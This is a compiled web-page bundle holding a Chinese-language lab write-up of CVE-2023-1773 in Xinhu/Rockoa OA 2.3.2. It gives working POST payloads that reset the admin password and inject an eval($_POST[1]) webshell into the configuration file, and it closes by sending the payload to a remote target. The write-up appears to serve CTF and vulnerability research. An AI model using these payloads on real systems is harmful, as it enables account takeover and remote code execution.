"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5812],{7288:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>r,contentTitle:()=>t,default:()=>o,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var s=i(85893),d=i(11151);const a={},t="CVE-2023-1773",c={id:"Yunjing/CVE/CVE-2023-1773",title:"CVE-2023-1773",description:"Tags",source:"@site/docs/Yunjing/CVE/CVE-2023-1773.md",sourceDirName:"Yunjing/CVE",slug:"/Yunjing/CVE/CVE-2023-1773",permalink:"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2023-1773",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/CVE/CVE-2023-1773.md",tags:[],version:"current",frontMatter:{},sidebar:"Yunjing_Sidebar",previous:{title:"CVE-2022-33980",permalink:"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2022-33980"},next:{title:"CVE-2023-27178",permalink:"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2023-27178"}},r={},l=[{value:"\u4fee\u6539 admin \u7528\u6237\u5bc6\u7801",id:"\u4fee\u6539-admin-\u7528\u6237\u5bc6\u7801",level:2},{value:"\u5199\u5165 webshell",id:"\u5199\u5165-webshell",level:2}];function h(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,d.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"cve-2023-1773",children:"CVE-2023-1773"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Tags"}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u4fe1\u547c OA <= 2.3.3 \u4ee3\u7801\u6ce8\u5165"}),"\n"]}),(0,s.jsx)(n.p,{children:"\u5b98\u65b9\u6570\u636e\u5e93\u8bb0\u5f55"}),(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"Rockoa 2.3.2 \u4e2d\u53d1\u73b0\u4e00\u4e2a\u6f0f\u6d1e\u3002 \u5b83\u5df2\u88ab\u5ba3\u5e03\u4e3a\u5173\u952e\u3002 \u8be5\u6f0f\u6d1e\u5f71\u54cd\u7ec4\u4ef6\u914d\u7f6e\u6587\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u6587\u4ef6 webmainConfig.php \u7684\u672a\u77e5\u4ee3\u7801\u3002 \u8fd9\u79cd\u64cd\u7eb5\u4f1a\u5bfc\u81f4\u4ee3\u7801\u6ce8\u5165\u3002 \u653b\u51fb\u53ef\u4ee5\u8fdc\u7a0b\u53d1\u8d77\u3002 \u8be5\u6f0f\u6d1e\u5df2\u5411\u516c\u4f17\u62ab\u9732\u5e76\u53ef\u80fd\u88ab\u4f7f\u7528\u3002 VDB-224674 \u662f\u5206\u914d\u7ed9\u6b64\u6f0f\u6d1e\u7684\u6807\u8bc6\u7b26\u3002"}),"\n"]})]}),"\n",(0,s.jsx)(n.p,{children:"\u53c2\u8003"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://potatowo233.github.io/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",children:"\u8bb0\u4e00\u6b21 CMS \u4ee3\u7801\u5ba1\u8ba1 - Potat0w0"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"https://nvd.nist.gov/vuln/detail/CVE-2023-1773",children:"NVD - CVE-2023-1773"})}),"\n"]}),"\n",(0,s.jsxs)(n.admonition,{type:"warning",children:[(0,s.jsx)(n.p,{children:"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u73af\u5883\u590d\u73b0\u9700\u8981\u81ea\u884c\u5728\u672c\u5730\u90e8\u7f72\u4e00\u4e2a\u4fe1\u547c v2.3.2 \u7684\u73af\u5883\u8fdb\u884c\u8c03\u8bd5"}),(0,s.jsxs)(n.p,{children:["\u73af\u5883\u5df2\u7ecf\u6253\u5305\u597d\uff1a",(0,s.jsx)(n.a,{href:"https://github.com/CTF-Archives/xinhu-v2.3.2",children:"CTF-Archives/xinhu-v2.3.2: \u4fe1\u547c v2.3.2 \u9488\u5bf9CVE-2023-1773\u7684\u7814\u7a76\u73af\u5883"})]}),(0,s.jsx)(n.p,{children:"\u9700\u8981\u6ce8\u610f\uff0c\u73af\u5883\u521d\u59cb\u5316\u7684\u65f6\u5019"}),(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:["\u5730\u5740\uff1a",(0,s.jsx)(n.code,{children:"localhost"})]}),"\n",(0,s.jsxs)(n.li,{children:["\u6570\u636e\u5e93\u7528\u6237\uff1a",(0,s.jsx)(n.code,{children:"root"})]}),"\n",(0,s.jsxs)(n.li,{children:["\u6570\u636e\u5e93\u5bc6\u7801\uff1a",(0,s.jsx)(n.code,{children:"123456"})]}),"\n"]})]}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u6839\u636e\u5206\u6790\u6587\u7ae0\u7684\u6d41\u7a0b\uff0c\u5728\u672c\u5730\u73af\u5883\u4e2d\u4fee\u6539 ",(0,s.jsx)(n.code,{children:"webmain/task/api/reimplatAction.php"})," \u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'// \u5e73\u53f0\u4e0a\u901a\u77e5\u8fc7\u6765\u7684\u6570\u636e\npublic function indexAction()\n{\n    $body = $this->getpostdata();\n    // add debug\n    echo $body."<br>";\n    if(!$body)return;\n    $db   = m(\'reimplat:dept\');\n    // add debug\n    $key   = $db->gethkey();\n    $test=$this->jm->strlook($body,$key);\n    echo $test."<br>";\n    $bodystr = $this->jm->strunlook($body, $key);\n    if(!$bodystr)return;\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u6837\u5b50\uff0c\u5c31\u53ef\u4ee5\u5728\u672c\u5730\u83b7\u53d6\u5230\u5904\u7406\u8fc7\u540e\u7684\u5b57\u7b26\u4e32"}),"\n",(0,s.jsx)(n.h2,{id:"\u4fee\u6539-admin-\u7528\u6237\u5bc6\u7801",children:"\u4fee\u6539 admin \u7528\u6237\u5bc6\u7801"}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\uff0c\u5411\u8def\u7531 ",(0,s.jsx)(n.code,{children:"/?p=webmain&d=task&m=reimplat|api&a=index"})," POST \u4ee5\u4e0b\u6570\u636e"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",children:'{"msgtype":"editpass","user":"admin","pass":"123"}\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(88768).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'{"msgtype":"editpass","user":"admin","pass":"123"}\n31ae15.X3amdiGpSx5aZqNWaq6NSZVut2MjYWm5UmMnRnZ!GZIXUmqvZUmqEY2Jnh7Y:\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ee7\u7eed\u5411\u8def\u7531 ",(0,s.jsx)(n.code,{children:"/?p=webmain&d=task&m=reimplat|api&a=index"})," POST \u7f16\u7801\u540e\u7684\u6570\u636e"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(50779).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"31ae15.X3amdiGpSx5aZqNWaq6NSZVut2MjYWm5UmMnRnZ!GZIXUmqvZUmqEY2Jnh7Y:\nl2WSyWmYkpFrx52Uy3mgh91umYqhh5CZ1pm0i46IrNmWgZu9j9CZjqWznoLQjFF7v4KQhZ2qr5K60Nd9jWSB08xrip4:\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6b64\u65f6\uff0c\u7528\u6237 ",(0,s.jsx)(n.code,{children:"admin"})," \u7684\u5bc6\u7801\u5df2\u7ecf\u88ab\u4fee\u6539\uff0c\u4fee\u6539\u4e3a ",(0,s.jsx)(n.code,{children:"123"})," \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(96002).Z+"",width:"2559",height:"1371"})}),"\n",(0,s.jsx)(n.h2,{id:"\u5199\u5165-webshell",children:"\u5199\u5165 webshell"}),"\n",(0,s.jsx)(n.p,{children:"\u8fdb\u4e00\u6b65\u653b\u51fb\uff0c\u5199\u5165 webshell"}),"\n",(0,s.jsxs)(n.p,{children:["\u5411\u8def\u7531 ",(0,s.jsx)(n.code,{children:"/?p=webmain&d=task&m=reimplat|api&a=index"})," POST \u4ee5\u4e0b\u6570\u636e"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",children:'{\n    "msgtype":"editmobile",\n    "user":"admin",\n    "mobile":"11\',name=\'\\neval($_POST[1]);//"\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(23585).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"31ae15.X3amdiGpSx5aZqNKompmcnltkcm2IraeXqYeeVpLIpczSW2RzOlLPoZKd0Z5aalJqal!R0celmW9ewdKZp8Wki4iYiLWDhL1jjV2gaGdSrQ::\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u5f97\u5230\u7684\u6570\u636e\u518d\u6b21 POST \u8fc7\u53bb"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(27661).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(n.p,{children:"\u6b64\u65f6\u67e5\u8be2\u6570\u636e\u5e93\uff0c\u5c31\u53ef\u4ee5\u53d1\u73b0\u6570\u636e\u5e93\u7684\u6570\u636e\u88ab\u7be1\u6539"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(21513).Z+"",width:"1539",height:"1155"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6b64\u65f6\u5728\u7cfb\u7edf\u4e0a\u91cd\u65b0\u767b\u5f55\uff0c\u7136\u540e\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"/?p=webmain&d=system&m=cog|cog&ajaxbool=true&a=savecong"})," \u8def\u7531\uff0c\u5c31\u662f webshell"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(76346).Z+"",width:"1542",height:"1040"})}),"\n",(0,s.jsx)(n.p,{children:"\u5728\u672c\u5730\u73af\u5883\u8ba1\u7b97\u597d\u6570\u636e\u4e4b\u540e\uff0c\u53d1\u9001\u7ed9\u8fdc\u7a0b"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:i(39518).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(n.p,{children:"\u5373\u53ef\u5728\u8fdc\u7a0b\u73af\u5883\u4e2d\u90e8\u7f72 webshell \u540e\u95e8\uff0c\u76f4\u63a5\u4f7f\u7528\u8681\u5251\u8fdb\u884c\u5229\u7528\u5373\u53ef"})]})}function o(e={}){const{wrapper:n}={...(0,d.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},76346:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240701-010115-619e4772300a9d1ac11b33ebd5446049.png"},39518:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240702-010251-bc5b74b10f395c57e3302d88d257eade.png"},88768:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240734-003447-ba44c9fe3b13a2b91ab5459e31d6ca93.png"},50779:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240735-003506-9ed9f52df8d98b5a4ad91b9675741761.png"},96002:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240736-003631-039cfb559796117a1387f56b5d8823ba.png"},23585:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240758-005805-b6c6e30740097c65b1bb3f6dc0ce9b13.png"},27661:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240758-005831-cf0d0cdd5dd2c4eaa8dff2794a0bfa68.png"},21513:(e,n,i)=>{i.d(n,{Z:()=>s});const s=i.p+"assets/images/image_20240759-005924-a70da4fd0b4263447b3b859068c9edf4.png"},11151:(e,n,i)=>{i.d(n,{Z:()=>c,a:()=>t});var s=i(67294);const d={},a=s.createContext(d);function t(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(d):e.components||d:t(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);